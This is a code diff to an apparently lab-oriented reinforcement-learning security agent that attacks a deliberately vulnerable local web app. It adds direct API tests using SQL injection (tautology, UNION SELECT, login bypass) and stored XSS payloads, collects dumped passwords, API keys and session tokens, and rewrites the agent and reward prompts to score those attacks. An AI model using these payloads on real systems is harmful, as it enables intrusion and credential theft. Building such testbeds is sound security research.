@@ -3,6 +3,7 @@ import sys
 import json
 import builtins
 import functools
+import aiohttp
 from datetime import datetime
 from typing import TypedDict, Annotated, List, Dict, Any
 from dotenv import load_dotenv
@@ -40,6 +41,230 @@ if len(API_KEYS) == 0:
 print(f"🔑 Loaded {len(API_KEYS)} API keys (Effective RPM: {len(API_KEYS) * 10})")
 if DEMO_MODE:
     print("🎬 DEMO MODE enabled - tight step limit for reliable demos")
+
+# Browser visibility mode
+HEADLESS_MODE = os.getenv("HEADLESS", "true").lower() == "true"
+if not HEADLESS_MODE:
+    print("👀 HEADLESS=false - Browser will be VISIBLE for demo/debugging")
+
+
+# --- DIRECT API TESTING (Hybrid Approach) ---
+# These tests run directly against the backend API, bypassing Playwright
+# for faster vulnerability discovery on endpoints that don't require UI interaction
+
+async def run_direct_api_tests(base_url: str = "http://localhost:3001") -> List[Dict[str, Any]]:
+    """
+    Run direct HTTP tests against known vulnerable API endpoints.
+    This is faster than Playwright for testing API-level vulnerabilities.
+    
+    Vulnerabilities tested:
+    1. SQL Injection on /api/users/search (database dump)
+    2. SQL Injection on /api/login (auth bypass)
+    3. UNION SELECT attack (schema disclosure)
+    4. Cleartext password storage (from SQLi response)
+    5. API key exposure (from SQLi response)
+    6. Session token exposure (from SQLi response)
+    
+    Returns a list of findings for discovered vulnerabilities.
+    """
+    findings = []
+    sqli_response_data = None  # Store SQLi response for additional analysis
+    
+    async with aiohttp.ClientSession() as session:
+        # Test 1: SQL Injection on /api/users/search
+        print("🔍 [API Test 1/6] Testing /api/users/search for SQLi...")
+        try:
+            sqli_payload = "' OR '1'='1' --"
+            async with session.get(
+                f"{base_url}/api/users/search",
+                params={"username": sqli_payload},
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                data = await resp.json()
+                sqli_response_data = data  # Save for further analysis
+                
+                # Response format: {"users": [...], "api_keys": [...], "sessions": [...]}
+                users = data.get("users", data) if isinstance(data, dict) else data
+                users = users if isinstance(users, list) else []
+                
+                # Check if we got more than expected (database dump) - SQLi returns ALL users
+                if len(users) > 1:
+                    print(f"✅ [API Test] SQLi VULNERABLE! Got {len(users)} users (expected 0-1)")
+                    findings.append({
+                        "step": "api_test",
+                        "action": "api_sqli_users_search",
+                        "target": {"endpoint": "/api/users/search", "param": "username"},
+                        "log": f"SQL injection on /api/users/search returned {len(users)} users",
+                        "reward": 2.0,
+                        "severity": "CRITICAL",
+                        "cwe": "CWE-89",
+                        "reason": "Database dump achieved via SQL injection",
+                        "evidence": json.dumps(users[:3])  # First 3 records as evidence
+                    })
+                else:
+                    print(f"ℹ️ [API Test] /api/users/search returned {len(users)} users (may need different payload)")
+        except Exception as e:
+            print(f"⚠️ [API Test] /api/users/search error: {e}")
+        
+        # Test 2: Check for CLEARTEXT passwords in SQLi response
+        print("🔍 [API Test 2/6] Analyzing SQLi response for cleartext passwords...")
+        if sqli_response_data:
+            users = sqli_response_data.get("users", [])
+            cleartext_passwords = []
+            for user in users:
+                if "password" in user and isinstance(user.get("password"), str):
+                    pwd = user.get("password", "")
+                    # Check if it looks like plaintext (not hashed)
+                    if len(pwd) < 64 and not pwd.startswith("$2") and not pwd.startswith("pbkdf2"):
+                        cleartext_passwords.append({"user": user.get("username"), "password": pwd})
+            
+            if cleartext_passwords:
+                print(f"✅ [API Test] CLEARTEXT PASSWORDS! Found {len(cleartext_passwords)} unhashed passwords")
+                findings.append({
+                    "step": "api_test",
+                    "action": "cleartext_password_storage",
+                    "target": {"endpoint": "/api/users/search", "field": "password"},
+                    "log": f"Found {len(cleartext_passwords)} users with cleartext passwords",
+                    "reward": 1.5,
+                    "severity": "HIGH",
+                    "cwe": "CWE-256",
+                    "reason": "Passwords stored in cleartext without hashing",
+                    "evidence": json.dumps(cleartext_passwords[:3])
+                })
+        
+        # Test 3: Check for API key exposure in SQLi response
+        print("🔍 [API Test 3/6] Analyzing SQLi response for API key exposure...")
+        if sqli_response_data:
+            api_keys = sqli_response_data.get("api_keys", [])
+            if api_keys and len(api_keys) > 0:
+                print(f"✅ [API Test] API KEYS EXPOSED! Found {len(api_keys)} API keys")
+                findings.append({
+                    "step": "api_test",
+                    "action": "api_key_exposure",
+                    "target": {"endpoint": "/api/users/search", "field": "api_keys"},
+                    "log": f"SQL injection exposed {len(api_keys)} API keys",
+                    "reward": 1.5,
+                    "severity": "CRITICAL",
+                    "cwe": "CWE-200",
+                    "reason": "API keys exposed via SQL injection response",
+                    "evidence": json.dumps([{"key": k.get("key", "")[:8] + "...", "owner": k.get("owner")} for k in api_keys])
+                })
+            
+            # Check for session token exposure
+            sessions = sqli_response_data.get("sessions", [])
+            if sessions and len(sessions) > 0:
+                print(f"✅ [API Test] SESSION TOKENS EXPOSED! Found {len(sessions)} active sessions")
+                findings.append({
+                    "step": "api_test",
+                    "action": "session_token_exposure",
+                    "target": {"endpoint": "/api/users/search", "field": "sessions"},
+                    "log": f"SQL injection exposed {len(sessions)} active session tokens",
+                    "reward": 1.5,
+                    "severity": "CRITICAL",
+                    "cwe": "CWE-200",
+                    "reason": "Active session tokens exposed via SQL injection",
+                    "evidence": json.dumps([{"user_id": s.get("user_id"), "token": s.get("token", "")[:20] + "..."} for s in sessions])
+                })
+        
+        # Test 4: UNION SELECT attack for schema disclosure
+        print("🔍 [API Test 4/6] Testing UNION SELECT attack for schema disclosure...")
+        try:
+            union_payload = "' UNION SELECT * FROM information_schema.tables --"
+            async with session.get(
+                f"{base_url}/api/users/search",
+                params={"username": union_payload},
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                data = await resp.json()
+                # Check if schema was disclosed
+                if "schema" in data or "tables" in str(data):
+                    print(f"✅ [API Test] UNION ATTACK worked! Schema exposed")
+                    findings.append({
+                        "step": "api_test",
+                        "action": "union_select_schema_disclosure",
+                        "target": {"endpoint": "/api/users/search", "attack": "UNION SELECT"},
+                        "log": "UNION SELECT attack exposed database schema",
+                        "reward": 1.5,
+                        "severity": "HIGH",
+                        "cwe": "CWE-89",
+                        "reason": "Database schema exposed via UNION SELECT injection",
+                        "evidence": json.dumps(data.get("schema", data))[:500]
+                    })
+                else:
+                    print(f"ℹ️ [API Test] UNION SELECT returned: {str(data)[:100]}")
+        except Exception as e:
+            print(f"⚠️ [API Test] UNION SELECT error: {e}")
+        
+        # Test 5: Auth Bypass on /api/login
+        print("🔍 [API Test 5/6] Testing /api/login for auth bypass...")
+        try:
+            sqli_login_payload = {
+                "username": "admin' OR '1'='1' --",
+                "password": "anything"
+            }
+            async with session.post(
+                f"{base_url}/api/login",
+                json=sqli_login_payload,
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                data = await resp.json()
+                # Check for successful auth bypass indicators
+                if resp.status == 200 and ("token" in data or "success" in str(data).lower() or "admin" in str(data).lower()):
+                    print(f"✅ [API Test] Auth Bypass VULNERABLE! Response: {str(data)[:100]}")
+                    findings.append({
+                        "step": "api_test",
+                        "action": "api_auth_bypass_login",
+                        "target": {"endpoint": "/api/login", "method": "POST"},
+                        "log": f"Auth bypass on /api/login successful",
+                        "reward": 2.0,
+                        "severity": "CRITICAL",
+                        "cwe": "CWE-287",
+                        "reason": "Authentication bypass via SQL injection",
+                        "evidence": json.dumps(data)[:500]
+                    })
+                else:
+                    print(f"ℹ️ [API Test] /api/login status {resp.status}, response: {str(data)[:100]}")
+        except Exception as e:
+            print(f"⚠️ [API Test] /api/login error: {e}")
+        
+        # Test 6: XSS via Contact Form (Stored XSS check)
+        print("🔍 [API Test 6/6] Testing /contacts for stored XSS...")
+        try:
+            xss_payload = {
+                "name": "<script>alert('XSS')</script>",
+                "email": "test@test.com",
+                "message": "<img src=x onerror=alert('XSS')>"
+            }
+            async with session.post(
+                f"{base_url}/contacts",
+                json=xss_payload,
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    # Check if XSS payload was stored unescaped
+                    if "<script>" in str(data) or "onerror" in str(data):
+                        print(f"✅ [API Test] Stored XSS VULNERABLE! Payload stored unescaped")
+                        findings.append({
+                            "step": "api_test",
+                            "action": "stored_xss_contact",
+                            "target": {"endpoint": "/contacts", "method": "POST"},
+                            "log": "Contact form accepts and stores XSS payloads without sanitization",
+                            "reward": 1.5,
+                            "severity": "MEDIUM",
+                            "cwe": "CWE-79",
+                            "reason": "Stored XSS - malicious scripts stored and potentially rendered",
+                            "evidence": json.dumps(data)[:500]
+                        })
+                    else:
+                        print(f"ℹ️ [API Test] Contact form response: {str(data)[:100]}")
+        except Exception as e:
+            print(f"⚠️ [API Test] /contacts error: {e}")
+    
+    print(f"\n{'='*60}")
+    print(f"📊 [API Test] Direct API tests complete: {len(findings)} vulnerabilities found")
+    print(f"{'='*60}\n")
+    return findings
 
 # Track API key usage to rotate intelligently
 API_KEY_INDEX = 0
@@ -111,17 +336,27 @@ async def initialize_browser(state: AgentState) -> dict:
     # Use TARGET_URL from environment variable
     target_url = TARGET_URL
     print(f"🎯 Target URL: {target_url}")
-    try:
-        await page.goto(target_url)
-        # Ensure we're on the home page, not a cached page
-        await page.wait_for_timeout(1000)
-        current_url = page.url
-        if "/users" in current_url or "/login" in current_url:
-            print("📍 Navigating back to home page...")
-            await page.goto(target_url)
+    page_loaded = False
+    for retry in range(3):
+        try:
+            await page.goto(target_url, timeout=10000)
+            # Ensure we're on the home page, not a cached page
             await page.wait_for_timeout(1000)
-    except Exception as e:
-        print(f"Warning: Could not load {target_url}. Make sure server is running.")
+            current_url = page.url
+            if "/users" in current_url or "/login" in current_url:
+                print("📍 Navigating back to home page...")
+                await page.goto(target_url)
+                await page.wait_for_timeout(1000)
+            page_loaded = True
+            print(f"✅ Page loaded successfully: {page.url}")
+            break
+        except Exception as e:
+            print(f"⚠️ Retry {retry+1}/3: Could not load {target_url}. Error: {str(e)[:100]}")
+            await asyncio.sleep(2)
+    
+    if not page_loaded:
+        print(f"❌ FATAL: Could not load {target_url} after 3 retries. Is the frontend running?")
+        print("💡 Tip: Start buggy-vibe with: cd target-apps/buggy-vibe && npm run dev")
 
     return {
         "browser": browser,
@@ -129,14 +364,15 @@ async def initialize_browser(state: AgentState) -> dict:
         "url": target_url,
         "steps": 0,
         "maxSteps": 50,  # Increased to allow reaching Users page
-        "logs": ["Started RL Training Session."],
+        "logs": ["Started RL Training Session." if page_loaded else "FAILED: Frontend not reachable"],
         "cumulativeReward": 0.0,
         "stepRewards": [],
         "trajectory": [],
         "visited_pages": set(),
         "actions_on_page": {},  # Track actions per page to prevent loops
         "actionHistory": [],  # Track action signatures for loop detection
-        "loopDetected": False
+        "loopDetected": False,
+        "page_loaded": page_loaded  # Track if page loaded successfully
     }
 async def analyze_and_decide(state: AgentState) -> dict:
     page = state["page"]
@@ -145,6 +381,11 @@ async def analyze_and_decide(state: AgentState) -> dict:
     logs = state["logs"]
     current_reward = state.get("cumulativeReward", 0.0)
     action_history = state.get("actionHistory", [])
+
+    # Skip browser exploration if page didn't load
+    if not state.get("page_loaded", True):
+        print("⚠️ Skipping browser exploration - page not loaded")
+        return {"lastAction": "finish"}
 
     if steps >= maxSteps:
         return {"lastAction": "finish"}
@@ -218,13 +459,23 @@ async def analyze_and_decide(state: AgentState) -> dict:
         temperature=0.1,
     )
 
+    # Track which vulnerabilities we've already found
+    vulns_found = []
+    for step in trajectory:
+        if step.get("reward", 0) >= 1.0:
+            target = step.get("target", {})
+            page_type = "users_search" if "search" in str(target.get("placeholder", "")).lower() else "login"
+            vulns_found.append(page_type)
+    vulns_found_str = ", ".join(vulns_found) if vulns_found else "None yet"
+    
     prompt = f"""
-    You are an RL Agent training to find security vulnerabilities and robustness issues.
+    You are an RL Agent training to find security vulnerabilities in web applications.
     
     Current State:
     - URL: {page.url}
     - Steps Taken: {steps}/{maxSteps}
     - Cumulative Reward: {current_reward} (Maximize this!)
+    - Vulnerabilities Found So Far: {vulns_found_str}
     
     {last_move_warning} <--- CRITICAL INSTRUCTION
     
@@ -234,31 +485,39 @@ async def analyze_and_decide(state: AgentState) -> dict:
     Recent Logs:
     {chr(10).join(logs[-3:])}
     
-    YOUR GOAL: Maximize your Reward Score.
-    CRITICAL MISSION: Navigate to /users page and perform SQL injection to dump all users!
+    YOUR GOAL: Find MULTIPLE vulnerabilities to maximize your reward!
+    
+    VULNERABILITY TARGETS (in priority order):
+    1. **Users Page SQLi** (CRITICAL - +2.0 reward):
+       - Navigate to /users page 
+       - Fill search box with: ' OR '1'='1' --
+       - Press Enter to trigger database dump
+       
+    2. **Login Page Auth Bypass** (CRITICAL - +2.0 reward):
+       - Navigate to /login page
+       - Fill username with: admin' OR '1'='1' --  
+       - Fill password with: anything
+       - Click Login to bypass authentication
+       
+    3. **Contact Form XSS** (HIGH - +1.0 reward):
+       - Navigate to /contact page
+       - Fill name/message with: <script>alert(1)</script>
+       - Submit to test for XSS
+    
+    STRATEGY:
+    - If on home page: Go to /users first (highest value target)
+    - If already exploited /users: Go to /login next
+    - If both exploited: Go to /contact for XSS
+    - DON'T repeat attacks on pages you've already tested!
     
     Current URL: {page.url}
     
-    IMPORTANT: Follow this exact sequence:
-    1. If on home page (localhost:5173): Click "Users" link directly (no login needed!)
-    2. If URL contains '/users': 
-       - Find the search input box (placeholder: "Enter username to search...")
-       - Fill it with: ' OR '1'='1' --
-       - Press Enter or click Search button
-    3. Look for database results showing multiple users
-    4. For UNION attack (full DB dump): Fill search with: ' UNION SELECT * FROM users --
-    5. STOP after seeing database dump (you've achieved the goal!)
-    
-    NOTE: You can go directly to Users page - no login required!
-    
     Rewards:
-    - +2.0: Database dump on Users page (HIGHEST PRIORITY!)
-    - +1.0: SQL injection success, XSS alert
-    - +0.5: Reached Users page
-    - +0.1: Valid NEW action
-    - -0.5: Repeated action
-    
-    If you see "Results:" or user data on the page, you've succeeded! Choose "finish" action.
+    - +2.0: Database dump OR auth bypass (HIGHEST!)
+    - +1.0: SQL injection submitted, XSS triggered
+    - +0.5: Reached new vulnerable page
+    - +0.2: Valid navigation to new page
+    - -0.5: Repeated action on same page
     
     Choose your next action. Return ONLY JSON:
     {{
@@ -267,8 +526,6 @@ async def analyze_and_decide(state: AgentState) -> dict:
       "actionDetails": "<strategy reasoning>",
       "inputValue": "<test_payload>" 
     }}
-    
-    (Example payloads: "test<script>alert(1)</script>", "' OR '1'='1", "admin")
     """
 
     try:
@@ -420,12 +677,35 @@ async def execute_action(state: AgentState) -> dict:
             await page.wait_for_timeout(500)
             await page.set_viewport_size({"width": 1280, "height": 800})
 
-        # Capture State (Screenshot) with timestamp
-        from datetime import datetime
-        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        steps = state.get("steps", 0)
-        path = f"qa_screenshots/step_{steps}_{timestamp}.png"
-        await page.screenshot(path=path)
+        # Capture State (Screenshot) - only on significant actions
+        # Significant = form submissions, SQL injection attempts, navigation to new pages
+        should_screenshot = False
+        screenshot_reason = ""
+        
+        if action == "fill_input" and payload.get("inputValue", ""):
+            # Screenshot after filling forms with payloads (potential vuln)
+            input_val = payload.get("inputValue", "").lower()
+            if any(kw in input_val for kw in ["'", "or", "1=1", "script", "alert", "--", "union"]):
+                should_screenshot = True
+                screenshot_reason = "sqli_or_xss_payload"
+        elif action == "click_element":
+            # Screenshot after clicking submit/login buttons
+            target_text = str(target_element_details.get("outerHTML", "")).lower()
+            if any(kw in target_text for kw in ["submit", "login", "search", "send"]):
+                should_screenshot = True
+                screenshot_reason = "form_submission"
+        elif "/login" in current_url or "/users" in current_url:
+            # Always screenshot on vulnerable pages after actions
+            should_screenshot = True
+            screenshot_reason = "vulnerable_page"
+        
+        if should_screenshot:
+            from datetime import datetime
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            steps = state.get("steps", 0)
+            path = f"qa_screenshots/step_{steps}_{screenshot_reason}_{timestamp}.png"
+            await page.screenshot(path=path)
+            logs.append(f"📸 Screenshot saved: {screenshot_reason}")
 
     except Exception as e:
         logs.append(f"Error: {str(e)}")
@@ -477,27 +757,41 @@ async def evaluate_reward(state: AgentState) -> dict:
         temperature=0.0
     )
     
+    current_url = state.get('page').url if state.get('page') else 'unknown'
+    
     prompt = f"""
-    You are a Security Reward Function. Evaluate this action result.
+    You are a Security Reward Function evaluating penetration testing actions.
     
     Action: {last_action}
     Log: {logs}
     Is Repeat Action: {is_repeat}
-    Current URL: {state.get('page').url if state.get('page') else 'unknown'}
+    Current URL: {current_url}
     
     Assign a Reward Score (-1.0 to 2.0):
-    - +2.0: Database dump achieved (multiple users with passwords shown on page) - MISSION COMPLETE!
-    - +1.5: Pressed Enter after SQL injection in search box on Users page
-    - +1.0: SQL injection payload entered in search box on Users page
-    - +0.8: Successfully navigated to Users page (/users in URL)
-    - +0.5: Clicked Users link in navbar
-    - +0.2: Valid navigation action
-    - +0.1: Valid action (200 OK) - ONLY IF NEW
-    - -0.5: Repeated action or no state change
-    - -1.0: Continuing after database dump (mission already complete)
-    - 0: Invalid action or error
     
-    PRIORITY: SQL injection in Users page search box is CRITICAL for demo!
+    **SQL INJECTION ON USERS PAGE** (Priority 1):
+    - +2.0: Database dump achieved (users with passwords visible)
+    - +1.5: Pressed Enter/Submit after SQL injection payload in search box
+    - +1.0: SQL injection payload (' OR '1'='1') entered in search box
+    - +0.8: Successfully on /users page
+    
+    **AUTH BYPASS ON LOGIN PAGE** (Priority 2):
+    - +2.0: Auth bypass successful (admin access gained)
+    - +1.5: Clicked Login after SQL injection in username field
+    - +1.0: SQL injection payload (admin' OR '1'='1' --) entered in login form
+    - +0.8: Successfully on /login page
+    
+    **XSS ON CONTACT PAGE** (Priority 3):
+    - +1.5: XSS payload submitted successfully
+    - +1.0: <script>alert(1)</script> entered in form field
+    - +0.5: Successfully on /contact page
+    
+    **GENERAL ACTIONS**:
+    - +0.5: Navigated to new vulnerable page
+    - +0.2: Valid navigation action
+    - 0.0: Neutral action
+    - -0.5: Repeated same action or no progress
+    - -1.0: Error or invalid action
     
     Return JSON: {{ "score": float, "reason": "brief explanation" }}
     """
@@ -656,15 +950,30 @@ def should_continue(state: AgentState) -> str:
         print("🎯 MISSION COMPLETE: SQL injection successful!")
         return "generateReport"
     
-    # Check trajectory for high-reward SQL injection success
+    # Count high-reward findings (vulnerabilities discovered)
     trajectory = state.get("trajectory", [])
-    for step in trajectory:
-        if step.get("reward", 0) >= 1.5:  # SQLi payload executed (was 2.0, lowered for reliability)
-            print("🎯 MISSION COMPLETE: High-reward vulnerability found!")
+    high_reward_count = sum(1 for step in trajectory if step.get("reward", 0) >= 1.0)
+    
+    # In DEMO_MODE, stop after finding 1 vulnerability for reliability
+    # Otherwise, try to find at least 2 vulnerabilities
+    min_vulns_for_demo = 1 if DEMO_MODE else 2
+    
+    if high_reward_count >= min_vulns_for_demo:
+        # Check if we've explored enough pages
+        visited_vulns = set()
+        for step in trajectory:
+            if step.get("reward", 0) >= 1.0:
+                target = step.get("target", {})
+                page_type = "users" if "search" in str(target.get("placeholder", "")).lower() else "login"
+                visited_vulns.add(page_type)
+        
+        # If we found vulns on multiple pages OR reached good count, stop
+        if len(visited_vulns) >= min_vulns_for_demo or high_reward_count >= 2:
+            print(f"🎯 MISSION COMPLETE: Found {high_reward_count} high-reward vulnerabilities on {len(visited_vulns)} pages!")
             return "generateReport"
     
     # DEMO MODE: Tight step limit for reliable demos
-    max_steps = DEMO_MAX_STEPS if DEMO_MODE else 15
+    max_steps = DEMO_MAX_STEPS if DEMO_MODE else 20
     if state.get("steps", 0) >= max_steps:
         print(f"⚠️ Stopping at {max_steps} steps {'(DEMO MODE)' if DEMO_MODE else ''}")
         return "generateReport"
@@ -700,11 +1009,55 @@ def create_workflow():
     return workflow.compile()
 
 async def main():
-    print("🏎️ Starting SecGym Agent...")
-    app = create_workflow()
-    config = {"recursion_limit": 100}  # Increased from default 25
-    await app.ainvoke({}, config=config)
-    print("✅ Session Finished. Check 'rl_training_data.json' and reports in 'qa_reports/' folder.")
+    print("🏎️ Starting SecGym Agent (Hybrid Mode: API + Browser)...")
+    
+    # Phase 0: Run direct API tests first (fast, no browser overhead)
+    print("\n" + "="*60)
+    print("  PHASE 0: DIRECT API TESTING")
+    print("="*60)
+    api_findings = await run_direct_api_tests()
+    
+    # Save API findings to trajectory data
+    api_trajectory = api_findings.copy()
+    
+    # Save API findings immediately (in case browser tests crash)
+    if api_trajectory:
+        print(f"\n💾 Saving {len(api_trajectory)} API findings...")
+        with open("rl_training_data.json", "w") as f:
+            json.dump(api_trajectory, f, indent=2)
+    
+    # Phase 1: Run browser-based RL exploration
+    print("\n" + "="*60)
+    print("  PHASE 1: BROWSER-BASED RL EXPLORATION")
+    print("="*60)
+    
+    browser_trajectory = []
+    try:
+        app = create_workflow()
+        config = {"recursion_limit": 100}  # Increased from default 25
+        result = await app.ainvoke({}, config=config)
+        
+        # Load browser findings
+        try:
+            with open("rl_training_data.json", "r") as f:
+                browser_trajectory = json.load(f)
+                # Filter out API findings (already counted)
+                browser_trajectory = [t for t in browser_trajectory if t.get("step") != "api_test"]
+        except:
+            pass
+    except Exception as e:
+        print(f"⚠️ Browser exploration failed: {e}")
+        print("📊 API findings are still saved.")
+    
+    # Merge API findings with browser findings
+    if api_trajectory or browser_trajectory:
+        print(f"\n📊 Merging findings: {len(api_trajectory)} API + {len(browser_trajectory)} browser")
+        combined_trajectory = api_trajectory + browser_trajectory
+        with open("rl_training_data.json", "w") as f:
+            json.dump(combined_trajectory, f, indent=2)
+        print(f"✅ Combined trajectory saved: {len(combined_trajectory)} total findings")
+    
+    print("\n✅ Session Finished. Check 'rl_training_data.json' and reports in 'qa_reports/' folder.")
     
     # Generate executive report
     print("📊 Generating executive report...")
